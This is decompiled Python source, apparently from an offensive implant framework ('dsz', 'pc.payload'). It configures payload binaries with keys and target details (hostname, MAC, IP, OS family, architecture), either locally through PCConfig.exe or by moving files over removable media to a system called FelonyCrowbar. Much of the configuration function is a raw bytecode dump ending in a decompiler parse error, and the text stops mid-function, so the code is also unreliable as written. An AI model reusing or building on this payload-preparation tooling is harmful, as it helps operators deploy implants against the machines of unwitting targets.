# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: exe.py
import dsz
import dsz.lp
import dsz.version
import pc.payload.settings
import glob
import os
import os.path
import re
import shutil
import xml.dom.minidom

def ConfigBinary(path, file, extraInfo):
    if pc.payload.settings.CheckConfigLocal():
        return _configureLocal(path, file, extraInfo)
    else:
        return _configureWithFC(path, file, extraInfo)


def _getKeyLocation(extraInfo):
    return extraInfo['KeyLocation']


def _configureLocal(path, file, extraInfo):
    ver = dsz.version.Info(dsz.script.Env['local_address'])
    toolLoc = dsz.lp.GetResourcesDirectory() + '/Pc/Tools/%s-%s/PCConfig.exe' % (ver.compiledArch, ver.os)
    outFile = path + '/' + file + '.configured'
    args = '-set -configfile \\"%s/config.xml\\"' % path
    args += ' -input \\"%s/%s.base\\" -output \\"%s\\"' % (path, file, outFile)
    args += ' -keys \\"%s\\"' % _getKeyLocation(extraInfo)
    if not _runTool(toolLoc, args):
        dsz.ui.Echo('* Failed to configure binary', dsz.ERROR)
        return ''
    if len(glob.glob(outFile)) == 0:
        dsz.ui.Echo('* Failed to find configured binary', dsz.ERROR)
        return ''
    args = '-display -configfile \\"%s/config.final.xml\\" -input \\"%s\\"' % (path, outFile)
    if not _runTool(toolLoc, args):
        dsz.ui.Echo('* Failed to query final payload configuration', dsz.WARNING)
    return outFile


def _configureWithFC--- This code section failed: ---

  59       0  LOAD_FAST             2  'extraInfo'
           3  LOAD_ATTR             0  'has_key'
           6  LOAD_CONST            1  'Fc_Name'
           9  CALL_FUNCTION_1       1 
          12  POP_JUMP_IF_TRUE     53  'to 53'

  60      15  LOAD_GLOBAL           1  'dsz'
          18  LOAD_ATTR             2  'ui'
          21  LOAD_ATTR             3  'Echo'
          24  LOAD_CONST            2  'It is incorrect to configure debug binaries via FC. Rerouting to local.'
          27  LOAD_GLOBAL           1  'dsz'
          30  LOAD_ATTR             4  'ERROR'
          33  CALL_FUNCTION_2       2 
          36  POP_TOP          

  61      37  LOAD_GLOBAL           5  '_configureLocal'
          40  LOAD_FAST             0  'path'
          43  LOAD_FAST             1  'file'
          46  LOAD_FAST             2  'extraInfo'
          49  CALL_FUNCTION_3       3 
          52  RETURN_END_IF    
        53_0  COME_FROM                '12'

  63      53  LOAD_GLOBAL           1  'dsz'
          56  LOAD_ATTR             6  'lp'
          59  LOAD_ATTR             7  'GetResourcesDirectory'
          62  CALL_FUNCTION_0       0 
          65  STORE_FAST            3  'toolLoc'

  66      68  LOAD_GLOBAL           8  '_getHostInformation'
          71  LOAD_FAST             2  'extraInfo'
          74  CALL_FUNCTION_1       1 
          77  POP_TOP          

  69      78  LOAD_CONST            3  ''
          81  STORE_FAST            4  'version'

  70      84  SETUP_EXCEPT         88  'to 175'

  71      87  LOAD_GLOBAL           9  'xml'
          90  LOAD_ATTR            10  'dom'
          93  LOAD_ATTR            11  'minidom'
          96  LOAD_ATTR            12  'parse'
          99  LOAD_FAST             3  'toolLoc'
         102  LOAD_CONST            4  'Pc\\Version.xml'
         105  BINARY_ADD       
         106  CALL_FUNCTION_1       1 
         109  STORE_FAST            5  'dom1'

  72     112  LOAD_FAST             5  'dom1'
         115  LOAD_ATTR            13  'getElementsByTagName'
         118  LOAD_CONST            5  'Version'
         121  CALL_FUNCTION_1       1 
         124  LOAD_CONST            6  ''
         127  BINARY_SUBSCR    
         128  STORE_FAST            6  'element'

  73     131  LOAD_CONST            7  '.'
         134  LOAD_ATTR            14  'join'
         137  LOAD_GLOBAL          15  'map'
         140  LOAD_FAST             6  'element'
         143  LOAD_ATTR            16  'getAttribute'
         146  LOAD_CONST            8  'major'
         149  LOAD_CONST            9  'minor'
         152  LOAD_CONST           10  'fix'
         155  BUILD_LIST_3          3 
         158  CALL_FUNCTION_2       2 
         161  CALL_FUNCTION_1       1 
         164  LOAD_CONST           11  '.X'
         167  BINARY_ADD       
         168  STORE_FAST            4  'version'
         171  POP_BLOCK        
         172  JUMP_FORWARD         30  'to 205'
       175_0  COME_FROM                '84'

  74     175  POP_TOP          
         176  POP_TOP          
         177  POP_TOP          

  75     178  LOAD_GLOBAL           1  'dsz'
         181  LOAD_ATTR             2  'ui'
         184  LOAD_ATTR             3  'Echo'
         187  LOAD_CONST           12  '* Failed to get PC version'
         190  LOAD_GLOBAL           1  'dsz'
         193  LOAD_ATTR             4  'ERROR'
         196  CALL_FUNCTION_2       2 
         199  POP_TOP          

  76     200  LOAD_CONST            3  ''
         203  RETURN_VALUE     
         204  END_FINALLY      
       205_0  COME_FROM                '204'
       205_1  COME_FROM                '172'

  78     205  LOAD_GLOBAL           1  'dsz'
         208  LOAD_ATTR             2  'ui'
         211  LOAD_ATTR             3  'Echo'
         214  LOAD_CONST           13  'The files need to be saved for transport to a machine with access'
         217  CALL_FUNCTION_1       1 
         220  POP_TOP          

  79     221  LOAD_GLOBAL           1  'dsz'
         224  LOAD_ATTR             2  'ui'
         227  LOAD_ATTR             3  'Echo'
         230  LOAD_CONST           14  'to FelonyCrowbar.  This requires some form of removable media'
         233  CALL_FUNCTION_1       1 
         236  POP_TOP          

  81     237  LOAD_GLOBAL          17  '_getDefaultPath'
         240  CALL_FUNCTION_0       0 
         243  STORE_FAST            7  'defaultDest'

  82     246  LOAD_GLOBAL           1  'dsz'
         249  LOAD_ATTR             2  'ui'
         252  LOAD_ATTR            18  'GetString'
         255  LOAD_CONST           15  'Please provide a path:'
         258  LOAD_GLOBAL          17  '_getDefaultPath'
         261  CALL_FUNCTION_0       0 
         264  CALL_FUNCTION_2       2 
         267  STORE_FAST            8  'dest'

  83     270  LOAD_GLOBAL           1  'dsz'
         273  LOAD_ATTR            19  'env'
         276  LOAD_ATTR            20  'Set'
         279  LOAD_GLOBAL          21  '_getDestinationDir'
         282  CALL_FUNCTION_0       0 
         285  LOAD_FAST             8  'dest'
         288  LOAD_CONST            6  ''
         291  LOAD_CONST            3  ''
         294  CALL_FUNCTION_4       4 
         297  POP_TOP          

  85     298  LOAD_GLOBAL          22  'os'
         301  LOAD_ATTR            23  'path'
         304  LOAD_ATTR            24  'normpath'
         307  LOAD_FAST             8  'dest'
         310  LOAD_CONST           16  '\\payload'
         313  BINARY_ADD       
         314  CALL_FUNCTION_1       1 
         317  STORE_FAST            8  'dest'

  86     320  LOAD_GLOBAL          25  'len'
         323  LOAD_GLOBAL          26  'glob'
         326  LOAD_ATTR            26  'glob'
         329  LOAD_FAST             8  'dest'
         332  CALL_FUNCTION_1       1 
         335  CALL_FUNCTION_1       1 
         338  LOAD_CONST            6  ''
         341  COMPARE_OP            4  '>'
         344  POP_JUMP_IF_FALSE   377  'to 377'

  87     347  LOAD_GLOBAL           1  'dsz'
         350  LOAD_ATTR             2  'ui'
         353  LOAD_ATTR             3  'Echo'
         356  LOAD_FAST             8  'dest'
         359  LOAD_CONST           17  ' already exists!  You may have already configured a payload!'
         362  BINARY_ADD       
         363  LOAD_GLOBAL           1  'dsz'
         366  LOAD_ATTR             4  'ERROR'
         369  CALL_FUNCTION_2       2 
         372  POP_TOP          

  88     373  LOAD_CONST            3  ''
         376  RETURN_END_IF    
       377_0  COME_FROM                '344'

  91     377  SETUP_EXCEPT         17  'to 397'

  92     380  LOAD_GLOBAL          22  'os'
         383  LOAD_ATTR            27  'mkdir'
         386  LOAD_FAST             8  'dest'
         389  CALL_FUNCTION_1       1 
         392  POP_TOP          
         393  POP_BLOCK        
         394  JUMP_FORWARD          7  'to 404'
       397_0  COME_FROM                '377'

  93     397  POP_TOP          
         398  POP_TOP          
         399  POP_TOP          

  94     400  JUMP_FORWARD          1  'to 404'
         403  END_FINALLY      
       404_0  COME_FROM                '403'
       404_1  COME_FROM                '394'

  95     404  SETUP_EXCEPT         21  'to 428'

  96     407  LOAD_GLOBAL          22  'os'
         410  LOAD_ATTR            27  'mkdir'
         413  LOAD_FAST             8  'dest'
         416  LOAD_CONST           18  '\\lib'
         419  BINARY_ADD       
         420  CALL_FUNCTION_1       1 
         423  POP_TOP          
         424  POP_BLOCK        
         425  JUMP_FORWARD          7  'to 435'
       428_0  COME_FROM                '404'

  97     428  POP_TOP          
         429  POP_TOP          
         430  POP_TOP          

  98     431  JUMP_FORWARD          1  'to 435'
         434  END_FINALLY      
       435_0  COME_FROM                '434'
       435_1  COME_FROM                '425'

  99     435  SETUP_EXCEPT         21  'to 459'

 100     438  LOAD_GLOBAL          22  'os'
         441  LOAD_ATTR            27  'mkdir'
         444  LOAD_FAST             8  'dest'
         447  LOAD_CONST           19  '\\data'
         450  BINARY_ADD       
         451  CALL_FUNCTION_1       1 
         454  POP_TOP          
         455  POP_BLOCK        
         456  JUMP_FORWARD          7  'to 466'
       459_0  COME_FROM                '435'

 101     459  POP_TOP          
         460  POP_TOP          
         461  POP_TOP          

 102     462  JUMP_FORWARD          1  'to 466'
         465  END_FINALLY      
       466_0  COME_FROM                '465'
       466_1  COME_FROM                '456'

 105     466  LOAD_FAST             3  'toolLoc'
         469  LOAD_CONST           20  '\\Pc\\Tools\\java-j2se_1.5\\'
         472  BINARY_ADD       
         473  STORE_FAST            9  'sourceDir'

 108     476  LOAD_GLOBAL          28  '_copyFiles'
         479  LOAD_FAST             9  'sourceDir'
         482  LOAD_FAST             8  'dest'
         485  LOAD_CONST           21  'PcRemoteConfiguration.jar'
         488  CALL_FUNCTION_3       3 
         491  UNARY_NOT        
         492  POP_JUMP_IF_TRUE    620  'to 620'

 109     495  LOAD_GLOBAL          28  '_copyFiles'
         498  LOAD_FAST             9  'sourceDir'
         501  LOAD_FAST             8  'dest'
         504  LOAD_CONST           22  'PcRemoteConfiguration.py'
         507  CALL_FUNCTION_3       3 
         510  UNARY_NOT        
         511  POP_JUMP_IF_TRUE    620  'to 620'

 110     514  LOAD_GLOBAL          28  '_copyFiles'
         517  LOAD_FAST             9  'sourceDir'
         520  LOAD_CONST           23  'lib'
         523  BINARY_ADD       
         524  LOAD_FAST             8  'dest'
         527  LOAD_CONST           24  '/lib'
         530  BINARY_ADD       
         531  LOAD_CONST           25  '*.jar'
         534  CALL_FUNCTION_3       3 
         537  UNARY_NOT        
         538  POP_JUMP_IF_TRUE    620  'to 620'

 111     541  LOAD_GLOBAL          28  '_copyFiles'
         544  LOAD_FAST             9  'sourceDir'
         547  LOAD_CONST           26  'data'
         550  BINARY_ADD       
         551  LOAD_FAST             8  'dest'
         554  LOAD_CONST           27  '/data'
         557  BINARY_ADD       
         558  LOAD_CONST           28  '*.properties'
         561  CALL_FUNCTION_3       3 
         564  UNARY_NOT        
         565  POP_JUMP_IF_TRUE    620  'to 620'

 112     568  LOAD_GLOBAL          28  '_copyFiles'
         571  LOAD_GLOBAL          29  '_getKeyLocation'
         574  LOAD_FAST             2  'extraInfo'
         577  CALL_FUNCTION_1       1 
         580  LOAD_FAST             8  'dest'
         583  LOAD_CONST           27  '/data'
         586  BINARY_ADD       
         587  LOAD_CONST           29  '*.bin'
         590  CALL_FUNCTION_3       3 
         593  UNARY_NOT        
         594  POP_JUMP_IF_TRUE    620  'to 620'

 113     597  LOAD_GLOBAL          28  '_copyFiles'
         600  LOAD_FAST             0  'path'
         603  LOAD_FAST             8  'dest'
         606  LOAD_CONST           27  '/data'
         609  BINARY_ADD       
         610  LOAD_CONST           30  'config.xml'
         613  CALL_FUNCTION_3       3 
         616  UNARY_NOT        
       617_0  COME_FROM                '594'
       617_1  COME_FROM                '565'
       617_2  COME_FROM                '538'
       617_3  COME_FROM                '511'
       617_4  COME_FROM                '492'
         617  POP_JUMP_IF_FALSE   646  'to 646'

 114     620  LOAD_GLOBAL           1  'dsz'
         623  LOAD_ATTR             2  'ui'
         626  LOAD_ATTR             3  'Echo'
         629  LOAD_CONST           31  '* Failed to copy files to removable media'
         632  LOAD_GLOBAL           1  'dsz'
         635  LOAD_ATTR             4  'ERROR'
         638  CALL_FUNCTION_2       2 
         641  POP_TOP          

 115     642  LOAD_CONST            3  ''
         645  RETURN_END_IF    
       646_0  COME_FROM                '617'

 118     646  LOAD_FAST             8  'dest'
         649  LOAD_CONST           32  '\\data\\exec.properties'
         652  BINARY_ADD       
         653  STORE_FAST           10  'execProperties'

 119     656  SETUP_EXCEPT         17  'to 676'

 120     659  LOAD_GLOBAL          22  'os'
         662  LOAD_ATTR            30  'remove'
         665  LOAD_FAST            10  'execProperties'
         668  CALL_FUNCTION_1       1 
         671  POP_TOP          
         672  POP_BLOCK        
         673  JUMP_FORWARD          7  'to 683'
       676_0  COME_FROM                '656'

 121     676  POP_TOP          
         677  POP_TOP          
         678  POP_TOP          

 122     679  JUMP_FORWARD          1  'to 683'
         682  END_FINALLY      
       683_0  COME_FROM                '682'
       683_1  COME_FROM                '673'

 124     683  LOAD_GLOBAL          31  're'
         686  LOAD_ATTR            32  'sub'
         689  LOAD_CONST           33  '\\\\'
         692  LOAD_CONST           34  '/'
         695  LOAD_FAST             8  'dest'
         698  CALL_FUNCTION_3       3 
         701  STORE_FAST           11  'mount'

 126     704  LOAD_GLOBAL          33  'list'
         707  CALL_FUNCTION_0       0 
         710  STORE_FAST           12  'lines'

 127     713  LOAD_FAST            12  'lines'
         716  LOAD_ATTR            34  'append'
         719  LOAD_CONST           35  'output:%s.configured\n'
         722  LOAD_FAST             1  'file'
         725  BINARY_MODULO    
         726  CALL_FUNCTION_1       1 
         729  POP_TOP          

 128     730  LOAD_FAST            12  'lines'
         733  LOAD_ATTR            34  'append'
         736  LOAD_CONST           36  'mount:%s\n'
         739  LOAD_FAST            11  'mount'
         742  BINARY_MODULO    
         743  CALL_FUNCTION_1       1 
         746  POP_TOP          

 129     747  LOAD_FAST            12  'lines'
         750  LOAD_ATTR            34  'append'
         753  LOAD_CONST           37  'version:%s\n'
         756  LOAD_FAST             4  'version'
         759  BINARY_MODULO    
         760  CALL_FUNCTION_1       1 
         763  POP_TOP          

 130     764  LOAD_FAST            12  'lines'
         767  LOAD_ATTR            34  'append'
         770  LOAD_CONST           38  'inXml:config.xml\n'
         773  CALL_FUNCTION_1       1 
         776  POP_TOP          

 131     777  LOAD_FAST            12  'lines'
         780  LOAD_ATTR            34  'append'
         783  LOAD_CONST           39  'outXml:config.final.xml\n'
         786  CALL_FUNCTION_1       1 
         789  POP_TOP          

 132     790  LOAD_FAST            12  'lines'
         793  LOAD_ATTR            34  'append'
         796  LOAD_CONST           40  'configName:%s\n'
         799  LOAD_FAST             2  'extraInfo'
         802  LOAD_CONST            1  'Fc_Name'
         805  BINARY_SUBSCR    
         806  BINARY_MODULO    
         807  CALL_FUNCTION_1       1 
         810  POP_TOP          

 133     811  LOAD_FAST            12  'lines'
         814  LOAD_ATTR            34  'append'
         817  LOAD_CONST           41  'osFamily:%s\n'
         820  LOAD_FAST             2  'extraInfo'
         823  LOAD_CONST           42  'Fc_OsFamily'
         826  BINARY_SUBSCR    
         827  BINARY_MODULO    
         828  CALL_FUNCTION_1       1 
         831  POP_TOP          

 134     832  LOAD_FAST            12  'lines'
         835  LOAD_ATTR            34  'append'
         838  LOAD_CONST           43  'osArchitecture:%s\n'
         841  LOAD_FAST             2  'extraInfo'
         844  LOAD_CONST           44  'Fc_Architecture'
         847  BINARY_SUBSCR    
         848  BINARY_MODULO    
         849  CALL_FUNCTION_1       1 
         852  POP_TOP          

 135     853  LOAD_FAST            12  'lines'
         856  LOAD_ATTR            34  'append'
         859  LOAD_CONST           45  'fc_response:FelonyCrowbar.xml\n'
         862  CALL_FUNCTION_1       1 
         865  POP_TOP          

 137     866  SETUP_LOOP           75  'to 944'
         869  LOAD_CONST           46  'hostname'
         872  LOAD_CONST           47  'mac'
         875  LOAD_CONST           48  'ip'
         878  BUILD_LIST_3          3 
         881  GET_ITER         
         882  FOR_ITER             58  'to 943'
         885  STORE_FAST           13  'extraKey'

 138     888  LOAD_FAST             2  'extraInfo'
         891  LOAD_ATTR             0  'has_key'
         894  LOAD_FAST            13  'extraKey'
         897  CALL_FUNCTION_1       1 
         900  POP_JUMP_IF_FALSE   882  'to 882'

 139     903  LOAD_FAST            12  'lines'
         906  LOAD_ATTR            34  'append'
         909  LOAD_FAST            13  'extraKey'
         912  LOAD_CONST           49  ':%s\n'
         915  LOAD_CONST           50  ','
         918  LOAD_ATTR            14  'join'
         921  LOAD_FAST             2  'extraInfo'
         924  LOAD_FAST            13  'extraKey'
         927  BINARY_SUBSCR    
         928  CALL_FUNCTION_1       1 
         931  BINARY_MODULO    
         932  BINARY_ADD       
         933  CALL_FUNCTION_1       1 
         936  POP_TOP          
         937  JUMP_BACK           882  'to 882'
         940  JUMP_BACK           882  'to 882'
         943  POP_BLOCK        
       944_0  COME_FROM                '866'

 143     944  SETUP_EXCEPT         50  'to 997'

 144     947  LOAD_GLOBAL          35  'open'
         950  LOAD_FAST            10  'execProperties'
         953  LOAD_CONST           51  'w'
         956  CALL_FUNCTION_2       2 
         959  STORE_FAST           14  'f'

 145     962  SETUP_FINALLY        17  'to 982'

 146     965  LOAD_FAST            14  'f'
         968  LOAD_ATTR            36  'writelines'
         971  LOAD_FAST            12  'lines'
         974  CALL_FUNCTION_1       1 
         977  POP_TOP          
         978  POP_BLOCK        
         979  LOAD_CONST            0  ''
       982_0  COME_FROM_FINALLY        '962'

 148     982  LOAD_FAST            14  'f'
         985  LOAD_ATTR            37  'close'
         988  CALL_FUNCTION_0       0 
         991  POP_TOP          
         992  END_FINALLY      
         993  POP_BLOCK        
         994  JUMP_FORWARD         34  'to 1031'
       997_0  COME_FROM                '944'

 149     997  POP_TOP          
         998  POP_TOP          
         999  POP_TOP          

 150    1000  LOAD_GLOBAL           1  'dsz'
        1003  LOAD_ATTR             2  'ui'
        1006  LOAD_ATTR             3  'Echo'
        1009  LOAD_CONST           52  '* Failed to write '
        1012  LOAD_FAST            10  'execProperties'
        1015  BINARY_ADD       
        1016  LOAD_GLOBAL           1  'dsz'
        1019  LOAD_ATTR             4  'ERROR'
        1022  CALL_FUNCTION_2       2 
        1025  POP_TOP          

 151    1026  LOAD_CONST            3  ''
        1029  RETURN_VALUE     
        1030  END_FINALLY      
      1031_0  COME_FROM                '1030'
      1031_1  COME_FROM                '994'

 154    1031  LOAD_GLOBAL          22  'os'
        1034  LOAD_ATTR            23  'path'
        1037  LOAD_ATTR            24  'normpath'
        1040  LOAD_CONST           53  '%s/data/%s.configured'
        1043  LOAD_FAST             8  'dest'
        1046  LOAD_FAST             1  'file'
        1049  BUILD_TUPLE_2         2 
        1052  BINARY_MODULO    
        1053  CALL_FUNCTION_1       1 
        1056  STORE_FAST           15  'configured'

 155    1059  SETUP_EXCEPT         17  'to 1079'

 156    1062  LOAD_GLOBAL          22  'os'
        1065  LOAD_ATTR            30  'remove'
        1068  LOAD_FAST            15  'configured'
        1071  CALL_FUNCTION_1       1 
        1074  POP_TOP          
        1075  POP_BLOCK        
        1076  JUMP_FORWARD          7  'to 1086'
      1079_0  COME_FROM                '1059'

 157    1079  POP_TOP          
        1080  POP_TOP          
        1081  POP_TOP          

 158    1082  JUMP_FORWARD          1  'to 1086'
        1085  END_FINALLY      
      1086_0  COME_FROM                '1085'
      1086_1  COME_FROM                '1076'

 160    1086  LOAD_GLOBAL          22  'os'
        1089  LOAD_ATTR            23  'path'
        1092  LOAD_ATTR            24  'normpath'
        1095  LOAD_CONST           54  '%s/data/config.final.xml'
        1098  LOAD_FAST             8  'dest'
        1101  BINARY_MODULO    
        1102  CALL_FUNCTION_1       1 
        1105  STORE_FAST           16  'payloadInfo'

 161    1108  SETUP_EXCEPT         17  'to 1128'

 162    1111  LOAD_GLOBAL          22  'os'
        1114  LOAD_ATTR            30  'remove'
        1117  LOAD_FAST            16  'payloadInfo'
        1120  CALL_FUNCTION_1       1 
        1123  POP_TOP          
        1124  POP_BLOCK        
        1125  JUMP_FORWARD          7  'to 1135'
      1128_0  COME_FROM                '1108'

 163    1128  POP_TOP          
        1129  POP_TOP          
        1130  POP_TOP          

 164    1131  JUMP_FORWARD          1  'to 1135'
        1134  END_FINALLY      
      1135_0  COME_FROM                '1134'
      1135_1  COME_FROM                '1125'

 168    1135  LOAD_GLOBAL           1  'dsz'
        1138  LOAD_ATTR             2  'ui'
        1141  LOAD_ATTR             3  'Echo'
        1144  LOAD_CONST           55  'Removable media has been configured.'
        1147  LOAD_GLOBAL           1  'dsz'
        1150  LOAD_ATTR            38  'GOOD'
        1153  CALL_FUNCTION_2       2 
        1156  POP_TOP          

 169    1157  LOAD_GLOBAL           1  'dsz'
        1160  LOAD_ATTR             2  'ui'
        1163  LOAD_ATTR             3  'Echo'
        1166  LOAD_CONST            3  ''
        1169  CALL_FUNCTION_1       1 
        1172  POP_TOP          

 170    1173  LOAD_GLOBAL           1  'dsz'
        1176  LOAD_ATTR             2  'ui'
        1179  LOAD_ATTR             3  'Echo'
        1182  LOAD_CONST           56  'Please take the removable media to a machine with access to'
        1185  CALL_FUNCTION_1       1 
        1188  POP_TOP          

 171    1189  LOAD_GLOBAL           1  'dsz'
        1192  LOAD_ATTR             2  'ui'
        1195  LOAD_ATTR             3  'Echo'
        1198  LOAD_CONST           57  'FelonyCrowbar and execute'
        1201  CALL_FUNCTION_1       1 
        1204  POP_TOP          

 172    1205  LOAD_GLOBAL           1  'dsz'
        1208  LOAD_ATTR             2  'ui'
        1211  LOAD_ATTR             3  'Echo'
        1214  LOAD_CONST           58  '\t%s/PcRemoteConfiguration.py'
        1217  LOAD_FAST             8  'dest'
        1220  BINARY_MODULO    
        1221  CALL_FUNCTION_1       1 
        1224  POP_TOP          

 173    1225  LOAD_GLOBAL           1  'dsz'
        1228  LOAD_ATTR             2  'ui'
        1231  LOAD_ATTR             3  'Echo'
        1234  LOAD_CONST           59  '\t\tCommandLine:  java -jar PcRemoteConfiguration.jar'
        1237  CALL_FUNCTION_1       1 
        1240  POP_TOP          

 174    1241  LOAD_GLOBAL           1  'dsz'
        1244  LOAD_ATTR             2  'ui'
        1247  LOAD_ATTR             3  'Echo'
        1250  LOAD_CONST           60  '\t\t\tfrom the directory'
        1253  CALL_FUNCTION_1       1 
        1256  POP_TOP          

 175    1257  LOAD_GLOBAL           1  'dsz'
        1260  LOAD_ATTR             2  'ui'
        1263  LOAD_ATTR             3  'Echo'
        1266  LOAD_CONST           61  '\t\tor Double-click on windows (and maybe linux)'
        1269  CALL_FUNCTION_1       1 
        1272  POP_TOP          

 176    1273  LOAD_GLOBAL           1  'dsz'
        1276  LOAD_ATTR             2  'ui'
        1279  LOAD_ATTR             3  'Echo'
        1282  LOAD_CONST           62  'Afterwards, please restore the removable media at the same location'
        1285  CALL_FUNCTION_1       1 
        1288  POP_TOP          

 178    1289  SETUP_LOOP          179  'to 1471'
        1292  LOAD_GLOBAL           1  'dsz'
        1295  LOAD_ATTR             2  'ui'
        1298  LOAD_ATTR            39  'Prompt'
        1301  LOAD_CONST           63  'Have you executed the file?'
        1304  CALL_FUNCTION_1       1 
        1307  JUMP_IF_FALSE_OR_POP  1343  'to 1343'

 179    1310  LOAD_GLOBAL          22  'os'
        1313  LOAD_ATTR            23  'path'
        1316  LOAD_ATTR            40  'exists'
        1319  LOAD_FAST            15  'configured'
        1322  CALL_FUNCTION_1       1 
        1325  JUMP_IF_FALSE_OR_POP  1343  'to 1343'

 180    1328  LOAD_GLOBAL          22  'os'
        1331  LOAD_ATTR            23  'path'
        1334  LOAD_ATTR            40  'exists'
        1337  LOAD_FAST            16  'payloadInfo'
        1340  CALL_FUNCTION_1       1 
      1343_0  COME_FROM                '1325'
      1343_1  COME_FROM                '1307'
        1343  POP_JUMP_IF_TRUE   1470  'to 1470'

 181    1346  LOAD_GLOBAL           1  'dsz'
        1349  LOAD_ATTR             2  'ui'
        1352  LOAD_ATTR             3  'Echo'
        1355  LOAD_CONST           64  'The configured files are not at:'
        1358  LOAD_GLOBAL           1  'dsz'
        1361  LOAD_ATTR            41  'WARNING'
        1364  CALL_FUNCTION_2       2 
        1367  POP_TOP          

 182    1368  LOAD_GLOBAL           1  'dsz'
        1371  LOAD_ATTR             2  'ui'
        1374  LOAD_ATTR             3  'Echo'
        1377  LOAD_CONST           65  '\t%s'
        1380  LOAD_FAST            15  'configured'
        1383  BINARY_MODULO    
        1384  LOAD_GLOBAL           1  'dsz'
        1387  LOAD_ATTR            41  'WARNING'
        1390  CALL_FUNCTION_2       2 
        1393  POP_TOP          

 183    1394  LOAD_GLOBAL           1  'dsz'
        1397  LOAD_ATTR             2  'ui'
        1400  LOAD_ATTR             3  'Echo'
        1403  LOAD_CONST           65  '\t%s'
        1406  LOAD_FAST            16  'payloadInfo'
        1409  BINARY_MODULO    
        1410  LOAD_GLOBAL           1  'dsz'
        1413  LOAD_ATTR            41  'WARNING'
        1416  CALL_FUNCTION_2       2 
        1419  POP_TOP          

 184    1420  LOAD_GLOBAL           1  'dsz'
        1423  LOAD_ATTR             2  'ui'
        1426  LOAD_ATTR            39  'Prompt'
        1429  LOAD_CONST           66  'Would you like to abort?'
        1432  LOAD_GLOBAL          42  'False'
        1435  CALL_FUNCTION_2       2 
        1438  POP_JUMP_IF_FALSE  1292  'to 1292'

 185    1441  LOAD_GLOBAL           1  'dsz'
        1444  LOAD_ATTR             2  'ui'
        1447  LOAD_ATTR             3  'Echo'
        1450  LOAD_CONST           67  'Configuration cancelled'
        1453  LOAD_GLOBAL           1  'dsz'
        1456  LOAD_ATTR             4  'ERROR'
        1459  CALL_FUNCTION_2       2 
        1462  POP_TOP          

 186    1463  LOAD_CONST            3  ''
        1466  RETURN_END_IF    
      1467_0  COME_FROM                '1438'
      1467_1  COME_FROM                '1343'
        1467  JUMP_BACK          1292  'to 1292'
        1470  POP_BLOCK        
      1471_0  COME_FROM                '1289'

 189    1471  LOAD_GLOBAL          22  'os'
        1474  LOAD_ATTR            23  'path'
        1477  LOAD_ATTR            24  'normpath'
        1480  LOAD_CONST           68  '%s/%s.configured'
        1483  LOAD_FAST             0  'path'
        1486  LOAD_FAST             1  'file'
        1489  BUILD_TUPLE_2         2 
        1492  BINARY_MODULO    
        1493  CALL_FUNCTION_1       1 
        1496  STORE_FAST           17  'finalFile'

 191    1499  SETUP_EXCEPT        135  'to 1637'

 192    1502  LOAD_GLOBAL          43  'shutil'
        1505  LOAD_ATTR            44  'copy'
        1508  LOAD_FAST            15  'configured'
        1511  LOAD_FAST            17  'finalFile'
        1514  CALL_FUNCTION_2       2 
        1517  POP_TOP          

 193    1518  LOAD_GLOBAL          43  'shutil'
        1521  LOAD_ATTR            44  'copy'
        1524  LOAD_FAST            16  'payloadInfo'
        1527  LOAD_CONST           69  '%s/config.final.xml'
        1530  LOAD_FAST             0  'path'
        1533  BINARY_MODULO    
        1534  CALL_FUNCTION_2       2 
        1537  POP_TOP          

 196    1538  LOAD_GLOBAL          22  'os'
        1541  LOAD_ATTR            23  'path'
        1544  LOAD_ATTR            24  'normpath'
        1547  LOAD_CONST           70  '%s/data/fc.xml'
        1550  LOAD_FAST             8  'dest'
        1553  BINARY_MODULO    
        1554  CALL_FUNCTION_1       1 
        1557  STORE_FAST           18  'fcXml'

 197    1560  LOAD_GLOBAL          22  'os'
        1563  LOAD_ATTR            23  'path'
        1566  LOAD_ATTR            40  'exists'
        1569  LOAD_FAST            18  'fcXml'
        1572  CALL_FUNCTION_1       1 
        1575  POP_JUMP_IF_FALSE  1601  'to 1601'

 198    1578  LOAD_GLOBAL          43  'shutil'
        1581  LOAD_ATTR            44  'copy'
        1584  LOAD_FAST            18  'fcXml'
        1587  LOAD_CONST           71  '%s/fc.xml'
        1590  LOAD_FAST             0  'path'
        1593  BINARY_MODULO    
        1594  CALL_FUNCTION_2       2 
        1597  POP_TOP          
        1598  JUMP_FORWARD          0  'to 1601'
      1601_0  COME_FROM                '1598'

 200    1601  LOAD_GLOBAL          43  'shutil'
        1604  LOAD_ATTR            45  'move'
        1607  LOAD_FAST             8  'dest'
        1610  LOAD_CONST           72  '%s_%s'
        1613  LOAD_FAST             8  'dest'
        1616  LOAD_GLOBAL           1  'dsz'
        1619  LOAD_ATTR            46  'Timestamp'
        1622  CALL_FUNCTION_0       0 
        1625  BUILD_TUPLE_2         2 
        1628  BINARY_MODULO    
        1629  CALL_FUNCTION_2       2 
        1632  POP_TOP          
        1633  POP_BLOCK        
        1634  JUMP_FORWARD         30  'to 1667'
      1637_0  COME_FROM                '1499'

 201    1637  POP_TOP          
        1638  POP_TOP          
        1639  POP_TOP          

 202    1640  LOAD_GLOBAL           1  'dsz'
        1643  LOAD_ATTR             2  'ui'
        1646  LOAD_ATTR             3  'Echo'
        1649  LOAD_CONST           73  '* Failed to copy configured files'
        1652  LOAD_GLOBAL           1  'dsz'
        1655  LOAD_ATTR             4  'ERROR'
        1658  CALL_FUNCTION_2       2 
        1661  POP_TOP          

 203    1662  LOAD_CONST            3  ''
        1665  RETURN_VALUE     
        1666  END_FINALLY      
      1667_0  COME_FROM                '1666'
      1667_1  COME_FROM                '1634'

 205    1667  LOAD_FAST            17  'finalFile'
        1670  RETURN_VALUE     
          -1  RETURN_LAST      

Parse error at or near `COME_FROM' instruction at offset 1467_1


def _copyFiles(sourceDir, destDir, mask):
    sourceDir = os.path.normpath(sourceDir)
    files = glob.glob('%s/%s' % (sourceDir, mask))
    for file in files:
        d, f = dsz.path.Split(file)
        try:
            shutil.copy('%s/%s' % (sourceDir, f), '%s/%s' % (destDir, f))
        except:
            return False

    return len(files) != 0


def _getDefaultPath():
    if dsz.env.Check(_getDestinationDir(), 0, ''):
        return dsz.env.Get(_getDestinationDir(), 0, '')
    else:
        return ''


def _getDestinationDir():
    return '_pc_FelonyCrowbar_Dir'


def _getHostInformation(extraInfo):
    files = list()
    while len(files) == 0:
